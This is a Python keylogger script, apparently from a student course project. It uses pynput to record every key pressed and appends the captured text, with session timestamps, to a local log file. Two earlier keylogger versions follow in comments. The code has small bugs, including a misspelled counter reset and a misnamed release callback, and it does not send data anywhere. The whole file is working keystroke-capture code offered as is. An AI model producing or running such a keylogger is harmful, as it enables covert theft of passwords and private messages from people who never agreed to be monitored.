from pynput import keyboard
import datetime as dt
count = 0 #to save after an amount of chars 
Keys = []
def on_press(key):
    global Keys, count
    Keys.append(key)
    print("{0} pressed".format(key)) # to print on terminal only
    if count == 0:
        writeFristTime()
    elif count >= 20:
        counts = 0
        write(Keys)
        Keys = []
    count += 1

# When to stop
def on_relase(key):
    if key == key.esc:
        return False 

def writeFristTime():
    #to write the \n on every logging session 
    with open("Keylogs2.txt", "a") as fristTime:
        fristTime.write("\n")
        fristTime.write("." * 30)
        fristTime.write("\n")
        fristTime.write(str(dt.datetime.now()))
        fristTime.write("\n")

def write(keys):
    with open("Keylogs2.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("backspace") > 0:
                f.write("(backspace)")
            elif k.find("space") > 0:
                f.write(" ")
            elif k.find("enter") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

with keyboard.Listener(on_press = on_press , on_relase  = on_relase) as listener:
    listener.join()


#Program 2
# def keyP
# ressed(key):
#     print(str(key))
#     with open("keylogs.txt", 'a') as log:
#         try:
#             char = key.char
#             log.write(char)
#         except:
#             print("Error getting char")

# if __name__ == "__main__":
#     listener = keyboard.Listener(on_press=keyPressed)
#     listener.start()
#     input()

#Program 1 
# log_dir = "d:\AAST Courses\semester 6\OOP java\Keylogger project"

# logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
# 	level=logging.DEBUG, format='%(asctime)s: %(message)s')

# def on_press(key):
#     logging.info(str(key))

# with Listener(on_press=on_press) as listener:
#     listener.join()